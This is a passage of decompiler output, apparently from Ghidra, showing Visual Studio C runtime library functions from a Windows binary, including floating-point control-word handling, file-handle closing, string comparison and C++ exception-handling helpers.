              iVar6 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e) + 1;
            }
          }
          else {
            iVar11 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12) + 1;
            iVar6 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e);
          }
        }
        uStack_12._2_2_ = (ushort)((uint)iVar11 >> 0x10);
        uStack_12._0_2_ = (ushort)iVar11;
        uStack_e._2_2_ = (ushort)((uint)iVar6 >> 0x10);
        uStack_e._0_2_ = (ushort)iVar6;
        if (uVar20 < 0x7fff) {
          bStack_19 = (byte)(uVar20 >> 8) | bStack_19 & 0x80;
          local_24._0_2_ = (ushort)uStack_12;
          param_1 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
          param_2 = CONCAT22(uStack_a,uStack_e._2_2_);
          local_1a = (undefined1)uVar20;
        }
        else {
          local_24._0_2_ = 0;
          param_1 = 0;
          iVar22 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
          param_2 = 0x80000000;
          local_1a = (undefined1)((uint)iVar22 >> 0x10);
          bStack_19 = (byte)((uint)iVar22 >> 0x18);
        }
        goto LAB_00412510;
      }
      iVar22 = 0;
    }
    else {
      iVar22 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
    }
    param_1 = 0;
    local_24._0_2_ = 0;
    param_2 = iVar22 << 0x10;
    local_1a = (undefined1)((uint)iVar22 >> 0x10);
    bStack_19 = (byte)((uint)iVar22 >> 0x18);
    iVar11 = 0;
    iVar6 = 0;
  }
LAB_00412510:
  auStack_20._0_2_ = (undefined2)((uint)param_1 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  *param_6 = local_50;
  if (((param_5 & 1) == 0) || (param_4 = param_4 + local_50, 0 < param_4)) {
    if (0x15 < param_4) {
      param_4 = 0x15;
    }
    iVar22 = CONCAT11(bStack_19,local_1a) - 0x3ffe;
    local_1a = 0;
    bStack_19 = 0;
    local_48 = 8;
    do {
      uStack_1c = (ushort)(param_2 >> 0x10);
      auStack_20._2_2_ = (undefined2)param_2;
      auStack_20._0_2_ = (undefined2)((uint)param_1 >> 0x10);
      local_24._2_2_ = (ushort)param_1;
      uVar10 = local_24._2_2_;
      iVar3 = CONCAT22(local_24._2_2_,(undefined2)local_24) << 1;
      local_24._0_2_ = (undefined2)iVar3;
      local_24._2_2_ = (ushort)((uint)iVar3 >> 0x10);
      uVar16 = CONCAT22(auStack_20._2_2_,auStack_20._0_2_) * 2;
      uVar20 = (ushort)auStack_20._2_2_ >> 0xf;
      uVar14 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2;
      local_48 = local_48 + -1;
      auStack_20._0_2_ = (undefined2)(uVar16 | uVar10 >> 0xf);
      param_1 = CONCAT22(auStack_20._0_2_,local_24._2_2_);
      auStack_20._2_2_ = (undefined2)(uVar16 >> 0x10);
      uStack_1c = (ushort)(uVar14 | uVar20);
      param_2 = CONCAT22(uStack_1c,auStack_20._2_2_);
      local_1a = (undefined1)(uVar14 >> 0x10);
      bStack_19 = (byte)(uVar14 >> 0x18);
    } while (local_48 != 0);
    if ((iVar22 < 0) && (uVar16 = -iVar22 & 0xff, uVar16 != 0)) {
      do {
        iVar3 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
        uVar17 = CONCAT22(auStack_20._2_2_,auStack_20._0_2_);
        iVar22 = CONCAT22(auStack_20._2_2_,auStack_20._0_2_);
        uVar14 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 1;
        uStack_1c = (ushort)uVar14;
        local_1a = (undefined1)(uVar14 >> 0x10);
        bStack_19 = bStack_19 >> 1;
        auStack_20._2_2_ = (ushort)auStack_20._2_2_ >> 1 | (ushort)((uint)(iVar3 << 0x1f) >> 0x10);
        uVar14 = CONCAT22(local_24._2_2_,(undefined2)local_24);
        local_24._2_2_ = local_24._2_2_ >> 1 | (ushort)((uint)(iVar22 << 0x1f) >> 0x10);
        uVar16 = uVar16 - 1;
        auStack_20._0_2_ = (undefined2)(uVar17 >> 1);
        local_24._0_2_ = (undefined2)(uVar14 >> 1);
      } while (0 < (int)uVar16);
    }
    uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    psVar21 = param_6 + 2;
    psVar18 = psVar21;
    uVar20 = auStack_20._2_2_;
    for (iVar22 = param_4 + 1; 0 < iVar22; iVar22 = iVar22 + -1) {
      local_24._2_2_ = (ushort)(uVar16 >> 0x10);
      local_24._0_2_ = (undefined2)uVar16;
      iVar1 = CONCAT22(auStack_20._0_2_,local_24._2_2_);
      local_38 = (undefined *)CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
      uVar14 = CONCAT22(uVar20,auStack_20._0_2_) * 2;
      uVar17 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2 | (uint)(uVar20 >> 0xf)) * 2 |
               uVar14 >> 0x1f;
      uVar23 = (uVar14 | local_24._2_2_ >> 0xf) * 2 | (uVar16 << 1) >> 0x1f;
      uVar14 = uVar16 * 5;
      if ((uVar14 < uVar16 * 4) || (uVar24 = uVar23, uVar14 < uVar16)) {
        uVar24 = uVar23 + 1;
        bVar4 = false;
        if ((uVar24 < uVar23) || (uVar24 == 0)) {
          bVar4 = true;
        }
        if (bVar4) {
          uVar17 = uVar17 + 1;
        }
      }
      uVar23 = CONCAT22(uVar20,auStack_20._0_2_) + uVar24;
      if ((uVar23 < uVar24) || (uVar23 < CONCAT22(uVar20,auStack_20._0_2_))) {
        uVar17 = uVar17 + 1;
      }
      iVar3 = (int)(local_38 + uVar17) * 2;
      uStack_1c = (ushort)iVar3 | (ushort)(uVar23 >> 0x1f);
      uVar16 = uVar16 * 10;
      local_1a = (undefined1)((uint)iVar3 >> 0x10);
      auStack_20._0_2_ = (ushort)(uVar23 * 2) | (ushort)(uVar14 >> 0x1f);
      *(char *)psVar18 = (char)((uint)iVar3 >> 0x18) + '0';
      psVar18 = (short *)((int)psVar18 + 1);
      auStack_20._2_2_ = (undefined2)(uVar23 * 2 >> 0x10);
      bStack_19 = 0;
      local_40 = (undefined2)local_24;
      uStack_3a = uVar20;
      uVar20 = auStack_20._2_2_;
    }
    param_2 = CONCAT22(uStack_1c,uVar20);
    psVar19 = psVar18 + -1;
    if (*(char *)((int)psVar18 + -1) < '5') {
      for (; (psVar21 <= psVar19 && ((char)*psVar19 == '0')); psVar19 = (short *)((int)psVar19 + -1)
          ) {
      }
      if (psVar19 < psVar21) {
        *param_6 = 0;
        *(undefined1 *)((int)param_6 + 3) = 1;
        *(byte *)(param_6 + 1) = ((local_64 != 0x8000) - 1U & 0xd) + 0x20;
        *(char *)psVar21 = '0';
        *(undefined1 *)((int)param_6 + 5) = 0;
        goto LAB_004126d8;
      }
    }
    else {
      for (; (psVar21 <= psVar19 && ((char)*psVar19 == '9')); psVar19 = (short *)((int)psVar19 + -1)
          ) {
        *(char *)psVar19 = '0';
      }
      if (psVar19 < psVar21) {
        psVar19 = (short *)((int)psVar19 + 1);
        *param_6 = *param_6 + 1;
      }
      *(char *)psVar19 = (char)*psVar19 + '\x01';
    }
    cVar15 = ((char)psVar19 - (char)param_6) + -3;
    *(char *)((int)param_6 + 3) = cVar15;
    *(undefined1 *)(cVar15 + 4 + (int)param_6) = 0;
  }
  else {
    *param_6 = 0;
    *(undefined2 *)((int)param_6 + 3) = 0x3001;
    *(byte *)(param_6 + 1) = ((local_64 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined1 *)((int)param_6 + 5) = 0;
  }
LAB_004126d8:
  uStack_3e = iVar1;
  local_24 = uVar16;
  uStack_12 = iVar11;
  uStack_e = iVar6;
  unique0x10000a4a = param_2;
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: __hw_cw */

/* Library Function - Single Match
    __hw_cw
   
   Library: Visual Studio 2010 Release */

uint __hw_cw(void)

{
  uint uVar1;
  uint uVar2;
  uint unaff_EBX;
  
  uVar1 = (uint)((unaff_EBX & 0x10) != 0);
  if ((unaff_EBX & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((unaff_EBX & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((unaff_EBX & 2) != 0) {
    uVar1 = uVar1 | 0x10;
  }
  if ((unaff_EBX & 1) != 0) {
    uVar1 = uVar1 | 0x20;
  }
  if ((unaff_EBX & 0x80000) != 0) {
    uVar1 = uVar1 | 2;
  }
  uVar2 = unaff_EBX & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x400;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x800;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0xc00;
    }
  }
  if ((unaff_EBX & 0x30000) == 0) {
    uVar1 = uVar1 | 0x300;
  }
  else if ((unaff_EBX & 0x30000) == 0x10000) {
    uVar1 = uVar1 | 0x200;
  }
  if ((unaff_EBX & 0x40000) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  return uVar1;
}



/* Function: ___hw_cw_sse2 */

/* Library Function - Single Match
    ___hw_cw_sse2
   
   Library: Visual Studio 2010 Release */

uint __fastcall ___hw_cw_sse2(undefined4 param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  if ((param_2 & 0x10) != 0) {
    uVar1 = 0x80;
  }
  if ((param_2 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_2 & 4) != 0) {
    uVar1 = uVar1 | 0x400;
  }
  if ((param_2 & 2) != 0) {
    uVar1 = uVar1 | 0x800;
  }
  if ((param_2 & 1) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  if ((param_2 & 0x80000) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  uVar2 = param_2 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x2000;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x4000;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0x6000;
    }
  }
  uVar2 = param_2 & 0x3000000;
  if (uVar2 == 0x1000000) {
    uVar1 = uVar1 | 0x8040;
  }
  else {
    if (uVar2 == 0x2000000) {
      return uVar1 | 0x40;
    }
    if (uVar2 == 0x3000000) {
      return uVar1 | 0x8000;
    }
  }
  return uVar1;
}



/* Function: __control87 */

/* Library Function - Single Match
    __control87
   
   Library: Visual Studio 2010 Release */

uint __cdecl __control87(uint _NewValue,uint _Mask)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  ushort in_FPUControlWord;
  
  uVar5 = 0;
  if ((in_FPUControlWord & 1) != 0) {
    uVar5 = 0x10;
  }
  if ((in_FPUControlWord & 4) != 0) {
    uVar5 = uVar5 | 8;
  }
  if ((in_FPUControlWord & 8) != 0) {
    uVar5 = uVar5 | 4;
  }
  if ((in_FPUControlWord & 0x10) != 0) {
    uVar5 = uVar5 | 2;
  }
  if ((in_FPUControlWord & 0x20) != 0) {
    uVar5 = uVar5 | 1;
  }
  if ((in_FPUControlWord & 2) != 0) {
    uVar5 = uVar5 | 0x80000;
  }
  uVar1 = in_FPUControlWord & 0xc00;
  if ((in_FPUControlWord & 0xc00) != 0) {
    if (uVar1 == 0x400) {
      uVar5 = uVar5 | 0x100;
    }
    else if (uVar1 == 0x800) {
      uVar5 = uVar5 | 0x200;
    }
    else if (uVar1 == 0xc00) {
      uVar5 = uVar5 | 0x300;
    }
  }
  if ((in_FPUControlWord & 0x300) == 0) {
    uVar5 = uVar5 | 0x20000;
  }
  else if ((in_FPUControlWord & 0x300) == 0x200) {
    uVar5 = uVar5 | 0x10000;
  }
  if ((in_FPUControlWord & 0x1000) != 0) {
    uVar5 = uVar5 | 0x40000;
  }
  uVar2 = ~_Mask & uVar5 | _NewValue & _Mask;
  if (uVar2 != uVar5) {
    uVar5 = __hw_cw();
    uVar2 = 0;
    if ((uVar5 & 1) != 0) {
      uVar2 = 0x10;
    }
    if ((uVar5 & 4) != 0) {
      uVar2 = uVar2 | 8;
    }
    if ((uVar5 & 8) != 0) {
      uVar2 = uVar2 | 4;
    }
    if ((uVar5 & 0x10) != 0) {
      uVar2 = uVar2 | 2;
    }
    if ((uVar5 & 0x20) != 0) {
      uVar2 = uVar2 | 1;
    }
    if ((uVar5 & 2) != 0) {
      uVar2 = uVar2 | 0x80000;
    }
    uVar3 = uVar5 & 0xc00;
    if (uVar3 != 0) {
      if (uVar3 == 0x400) {
        uVar2 = uVar2 | 0x100;
      }
      else if (uVar3 == 0x800) {
        uVar2 = uVar2 | 0x200;
      }
      else if (uVar3 == 0xc00) {
        uVar2 = uVar2 | 0x300;
      }
    }
    if ((uVar5 & 0x300) == 0) {
      uVar2 = uVar2 | 0x20000;
    }
    else if ((uVar5 & 0x300) == 0x200) {
      uVar2 = uVar2 | 0x10000;
    }
    if ((uVar5 & 0x1000) != 0) {
      uVar2 = uVar2 | 0x40000;
    }
  }
  uVar5 = 0;
  if (DAT_0041ebdc != 0) {
    if ((char)MXCSR < '\0') {
      uVar5 = 0x10;
    }
    if ((MXCSR & 0x200) != 0) {
      uVar5 = uVar5 | 8;
    }
    if ((MXCSR & 0x400) != 0) {
      uVar5 = uVar5 | 4;
    }
    if ((MXCSR & 0x800) != 0) {
      uVar5 = uVar5 | 2;
    }
    if ((MXCSR & 0x1000) != 0) {
      uVar5 = uVar5 | 1;
    }
    if ((MXCSR & 0x100) != 0) {
      uVar5 = uVar5 | 0x80000;
    }
    uVar3 = MXCSR & 0x6000;
    if (uVar3 != 0) {
      if (uVar3 == 0x2000) {
        uVar5 = uVar5 | 0x100;
      }
      else if (uVar3 == 0x4000) {
        uVar5 = uVar5 | 0x200;
      }
      else if (uVar3 == 0x6000) {
        uVar5 = uVar5 | 0x300;
      }
    }
    uVar4 = MXCSR & 0x8040;
    if (uVar4 == 0x40) {
      uVar5 = uVar5 | 0x2000000;
    }
    else if (uVar4 == 0x8000) {
      uVar5 = uVar5 | 0x3000000;
    }
    else if (uVar4 == 0x8040) {
      uVar5 = uVar5 | 0x1000000;
    }
    uVar4 = ~(_Mask & 0x308031f) & uVar5 | _Mask & 0x308031f & _NewValue;
    if (uVar4 != uVar5) {
      uVar5 = ___hw_cw_sse2(uVar3,uVar4);
      ___set_fpsr_sse2(uVar5);
      uVar5 = 0;
      if ((char)MXCSR < '\0') {
        uVar5 = 0x10;
      }
      if ((MXCSR & 0x200) != 0) {
        uVar5 = uVar5 | 8;
      }
      if ((MXCSR & 0x400) != 0) {
        uVar5 = uVar5 | 4;
      }
      if ((MXCSR & 0x800) != 0) {
        uVar5 = uVar5 | 2;
      }
      if ((MXCSR & 0x1000) != 0) {
        uVar5 = uVar5 | 1;
      }
      if ((MXCSR & 0x100) != 0) {
        uVar5 = uVar5 | 0x80000;
      }
      uVar3 = MXCSR & 0x6000;
      if (uVar3 != 0) {
        if (uVar3 == 0x2000) {
          uVar5 = uVar5 | 0x100;
        }
        else if (uVar3 == 0x4000) {
          uVar5 = uVar5 | 0x200;
        }
        else if (uVar3 == 0x6000) {
          uVar5 = uVar5 | 0x300;
        }
      }
      uVar3 = MXCSR & 0x8040;
      if (uVar3 == 0x40) {
        uVar5 = uVar5 | 0x2000000;
      }
      else if (uVar3 == 0x8000) {
        uVar5 = uVar5 | 0x3000000;
      }
      else if (uVar3 == 0x8040) {
        uVar5 = uVar5 | 0x1000000;
      }
    }
    uVar3 = uVar5 ^ uVar2;
    uVar2 = uVar5 | uVar2;
    if ((uVar3 & 0x8031f) != 0) {
      uVar2 = uVar2 | 0x80000000;
    }
  }
  return uVar2;
}



/* Function: __close_nolock */

/* Library Function - Single Match
    __close_nolock
   
   Library: Visual Studio 2010 Release */

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_0041eac0 + 0x84) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_0041eac0 + 0x44) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_00412bca;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_00412bcc;
    }
  }
LAB_00412bca:
  DVar4 = 0;
LAB_00412bcc:
  __free_osfhnd(_FileHandle);
  *(undefined1 *)((&DAT_0041eac0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) = 0;
  if (DVar4 == 0) {
    iVar5 = 0;
  }
  else {
    __dosmaperr(DVar4);
    iVar5 = -1;
  }
  return iVar5;
}



/* Function: __close */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    __close
   
   Library: Visual Studio 2010 Release */

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041eaa8)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0041eac0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0041eac0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          local_20 = -1;
        }
        else {
          local_20 = __close_nolock(_FileHandle);
        }
        FUN_00412cbc();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004087f3();
  }
  return -1;
}



/* Function: FUN_00412cbc */

void FUN_00412cbc(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



/* Function: __freebuf */

/* Library Function - Single Match
    __freebuf
   
   Library: Visual Studio 2010 Release */

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    _free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



/* Function: ___ascii_strnicmp */

/* Library Function - Single Match
    ___ascii_strnicmp
   
   Library: Visual Studio */

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      cVar1 = *_Str2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = _Str2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_00412d51;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_00412d51:
      _MaxCount = 0xffffffff;
      if (!bVar5) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



/* Function: ___mtold12 */

/* Library Function - Single Match
    ___mtold12
   
   Library: Visual Studio 2010 Release */

void __cdecl ___mtold12(char *param_1,int param_2,uint *param_3)

{
  uint uVar1;
  uint uVar2;
  bool bVar3;
  uint *puVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  short local_8;
  
  puVar4 = param_3;
  uVar7 = 0;
  local_8 = 0x404e;
  *param_3 = 0;
  param_3[1] = 0;
  param_3[2] = 0;
  if (param_2 != 0) {
    param_3 = (uint *)0x0;
    do {
      uVar2 = *puVar4;
      uVar9 = *puVar4;
      uVar8 = puVar4[1];
      uVar1 = puVar4[2];
      bVar3 = false;
      uVar5 = (uVar7 * 2 | uVar2 >> 0x1f) * 2 | uVar2 * 2 >> 0x1f;
      uVar2 = uVar2 * 4;
      uVar7 = ((int)param_3 * 2 | uVar7 >> 0x1f) * 2 | uVar7 * 2 >> 0x1f;
      uVar6 = uVar9 + uVar2;
      *puVar4 = uVar2;
      puVar4[1] = uVar5;
      puVar4[2] = uVar7;
      if ((uVar6 < uVar2) || (uVar6 < uVar9)) {
        bVar3 = true;
      }
      *puVar4 = uVar6;
      uVar9 = uVar5;
      if (bVar3) {
        bVar3 = false;
        uVar9 = uVar5 + 1;
        if ((uVar9 < uVar5) || (uVar9 == 0)) {
          bVar3 = true;
        }
        puVar4[1] = uVar9;
        if (bVar3) {
          uVar7 = uVar7 + 1;
          puVar4[2] = uVar7;
        }
      }
      bVar3 = false;
      uVar2 = uVar9 + uVar8;
      if ((uVar2 < uVar9) || (uVar2 < uVar8)) {
        bVar3 = true;
      }
      puVar4[1] = uVar2;
      if (bVar3) {
        uVar7 = uVar7 + 1;
        puVar4[2] = uVar7;
      }
      bVar3 = false;
      param_3 = (uint *)((uVar7 + uVar1) * 2 | uVar2 >> 0x1f);
      uVar9 = uVar6 * 2;
      uVar8 = uVar2 * 2 | uVar6 >> 0x1f;
      puVar4[2] = (uint)param_3;
      *puVar4 = uVar9;
      puVar4[1] = uVar8;
      uVar7 = uVar9 + (int)*param_1;
      if ((uVar7 < uVar9) || (uVar7 < (uint)(int)*param_1)) {
        bVar3 = true;
      }
      *puVar4 = uVar7;
      uVar7 = uVar8;
      if (bVar3) {
        uVar7 = uVar8 + 1;
        bVar3 = false;
        if ((uVar7 < uVar8) || (uVar7 == 0)) {
          bVar3 = true;
        }
        puVar4[1] = uVar7;
        if (bVar3) {
          param_3 = (uint *)((int)param_3 + 1);
          puVar4[2] = (uint)param_3;
        }
      }
      param_2 = param_2 + -1;
      param_1 = param_1 + 1;
      puVar4[1] = uVar7;
      puVar4[2] = (uint)param_3;
    } while (param_2 != 0);
  }
  if (puVar4[2] == 0) {
    uVar7 = puVar4[1];
    do {
      local_8 = local_8 + -0x10;
      uVar9 = uVar7 >> 0x10;
      uVar7 = uVar7 << 0x10 | *puVar4 >> 0x10;
      puVar4[1] = uVar7;
      *puVar4 = *puVar4 << 0x10;
    } while (uVar9 == 0);
    puVar4[2] = uVar9;
  }
  uVar7 = puVar4[2];
  if ((uVar7 & 0x8000) == 0) {
    uVar9 = puVar4[1];
    do {
      local_8 = local_8 + -1;
      uVar8 = uVar7 * 2;
      uVar7 = uVar8 | uVar9 >> 0x1f;
      uVar9 = uVar9 * 2 | *puVar4 >> 0x1f;
      *puVar4 = *puVar4 * 2;
      puVar4[1] = uVar9;
      puVar4[2] = uVar7;
    } while ((uVar8 & 0x8000) == 0);
  }
  *(short *)((int)puVar4 + 10) = local_8;
  return;
}



/* Function: RtlUnwind */

void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    /* WARNING: Could not recover jumptable at 0x00412f46. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



/* Function: _JumpToContinuation */

/* Library Function - Single Match
    void __stdcall _JumpToContinuation(void *,struct EHRegistrationNode *)
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release */

void _JumpToContinuation(void *param_1,EHRegistrationNode *param_2)

{
                    /* WARNING: Load size is inaccurate */
  ExceptionList = *ExceptionList;
                    /* WARNING: Could not recover jumptable at 0x00412f77. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)param_1)();
  return;
}



/* Function: FID_conflict:_CallMemberFunction1 */

/* Library Function - Multiple Matches With Different Base Names
    void __stdcall _CallMemberFunction1(void *,void *,void *)
    void __stdcall _CallMemberFunction2(void *,void *,void *,int)
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release */

void FID_conflict__CallMemberFunction1(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    /* WARNING: Could not recover jumptable at 0x00412f83. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



/* Function: _UnwindNestedFrames */

/* Library Function - Single Match
    void __stdcall _UnwindNestedFrames(struct EHRegistrationNode *,struct EHExceptionRecord *)
   
   Library: Visual Studio 2010 Release */

void _UnwindNestedFrames(EHRegistrationNode *param_1,EHExceptionRecord *param_2)

{
  void *pvVar1;
  
  pvVar1 = ExceptionList;
  RtlUnwind(param_1,(PVOID)0x412fb0,(PEXCEPTION_RECORD)param_2,(PVOID)0x0);
  *(uint *)(param_2 + 4) = *(uint *)(param_2 + 4) & 0xfffffffd;
  *(void **)pvVar1 = ExceptionList;
  ExceptionList = pvVar1;
  return;
}



/* Function: FID_conflict:___CxxFrameHandler3 */

/* Library Function - Multiple Matches With Different Base Names
    ___CxxFrameHandler
    ___CxxFrameHandler2
    ___CxxFrameHandler3
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release */

undefined4 __cdecl
FID_conflict____CxxFrameHandler3
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4)

{
  _s_FuncInfo *in_EAX;
  undefined4 uVar1;
  
  uVar1 = ___InternalCxxFrameHandler
                    (param_1,param_2,param_3,param_4,in_EAX,0,(EHRegistrationNode *)0x0,'\0');
  return uVar1;
}



/* Function: CatchGuardHandler */

/* Library Function - Single Match
    enum _EXCEPTION_DISPOSITION __cdecl CatchGuardHandler(struct EHExceptionRecord *,struct
   CatchGuardRN *,void *,void *)
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

_EXCEPTION_DISPOSITION __cdecl
CatchGuardHandler(EHExceptionRecord *param_1,CatchGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  
  __security_check_cookie(*(uint *)(param_2 + 8) ^ (uint)param_2);
  _Var1 = ___InternalCxxFrameHandler
                    (param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,
                     (void *)0x0,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
                     (EHRegistrationNode *)param_2,'\0');
  return _Var1;
}



/* Function: _CallSETranslator */

/* Library Function - Single Match
    int __cdecl _CallSETranslator(struct EHExceptionRecord *,struct EHRegistrationNode *,void *,void
   *,struct _s_FuncInfo const *,int,struct EHRegistrationNode *)
   
   Library: Visual Studio 2010 Release */

int __cdecl
_CallSETranslator(EHExceptionRecord *param_1,EHRegistrationNode *param_2,void *param_3,void *param_4
                 ,_s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7)

{
  _ptiddata p_Var1;
  int local_3c;
  EHExceptionRecord *local_38;
  void *local_34;
  code *local_30;
  undefined4 *local_2c;
  code *local_28;
  uint local_24;
  _s_FuncInfo *local_20;
  EHRegistrationNode *local_1c;
  int local_18;
  EHRegistrationNode *local_14;
  undefined1 *local_10;
  undefined1 *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffc0;
  if (param_1 == (EHExceptionRecord *)0x123) {
    *(undefined4 *)param_2 = 0x4130ed;
    local_3c = 1;
  }
  else {
    local_28 = TranslatorGuardHandler;
    local_24 = DAT_004191b4 ^ (uint)&local_2c;
    local_20 = param_5;
    local_1c = param_2;
    local_18 = param_6;
    local_14 = param_7;
    local_8 = 0;
    local_2c = (undefined4 *)ExceptionList;
    ExceptionList = &local_2c;
    local_38 = param_1;
    local_34 = param_3;
    p_Var1 = __getptd();
    local_30 = (code *)p_Var1->_translator;
    (*local_30)(*(undefined4 *)param_1,&local_38);
    local_3c = 0;
    if (local_8 != 0) {
                    /* WARNING: Load size is inaccurate */
      *local_2c = *ExceptionList;
    }
    ExceptionList = local_2c;
  }
  return local_3c;
}



/* Function: TranslatorGuardHandler */

/* Library Function - Single Match
    enum _EXCEPTION_DISPOSITION __cdecl TranslatorGuardHandler(struct EHExceptionRecord *,struct
   TranslatorGuardRN *,void *,void *)
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release */

_EXCEPTION_DISPOSITION __cdecl
TranslatorGuardHandler
          (EHExceptionRecord *param_1,TranslatorGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  code *local_8;
  
  __security_check_cookie(*(uint *)(param_2 + 8) ^ (uint)param_2);
  if ((*(uint *)(param_1 + 4) & 0x66) != 0) {
